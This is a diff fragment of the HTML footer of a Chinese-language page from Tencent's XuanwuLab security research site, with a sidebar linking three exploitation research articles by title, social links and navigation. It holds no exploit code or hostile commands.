+    <h3 class="widget-title">最近更新</h3>
+    <hr>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/cn/2015/12/09/bypass-dep-and-cfg-using-jit-compiler-in-chakra-engine/">利用Chakra JIT绕过DEP和CFG</a>
+          </li>
+        
+          <li>
+            <a href="/cn/2015/08/27/Poking-a-Hole-in-the-Patch/">在补丁上戳个洞——利用已经被修复的漏洞实现IE沙箱逃逸</a>
+          </li>
+        
+          <li>
+            <a href="/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/">JIT引擎触发RowHammer可行性研究</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+      </div>
+      <footer id="footer">
+  <div id="outer">
+    <div id="footer-infoi" >
+        <div id="us">
+            <ul id="us_ul">
+            
+                <li id="follow_us" class="us_li"><p>关注我们: </p></li>
+                
+                <li class="us_li">
+                <a class="social_icon_twitter" href="https://twitter.com/xuanwulab" target="_blank">
+                <img class="social_icon_img_twitter" src="/cn/css/images/twitter_chose.png" />
+                </a>
+                </li>
+                
+                <li class="us_li">
+                <a class="social_icon_weibo" href="http://weibo.com/xuanwulab" target="_blank">
+                <img class="social_icon_img_weibo" src="/cn/css/images/weibo_chose.png" />
+                </a>
+                </li>
+                
+                <li class="us_li">
+                <a class="social_icon_rss" href="/cn/atom.xml" target="_blank">
+                <img class="social_icon_img_rss" src="/cn/css/images/rss_chose.png" />
+                </a>
+                </li>
+                
+            </ul>
+        </div>
+        <div id="copyright"><p>Copyright &copy; 2015 Tencent's XuanwuLab.All Rights Reserved.<p></div>
+  </>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/cn" class="mobile-nav-link">首页</a>
+  
+    <a href="/cn/advisories" class="mobile-nav-link">安全公告</a>
+  
+    <a href="/cn/policy" class="mobile-nav-link">披露原则</a>
+  
+    <a href="/cn/archives" class="mobile-nav-link">归档</a>
+  
+    <a href="/cn/about" class="mobile-nav-link">关于</a>
+  
+</nav>
+
+    <!-- 
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/cn/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/cn/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/cn/js/script.js" type="text/javascript"></script>
+ -->
+  </div>
+</body>
+</html>
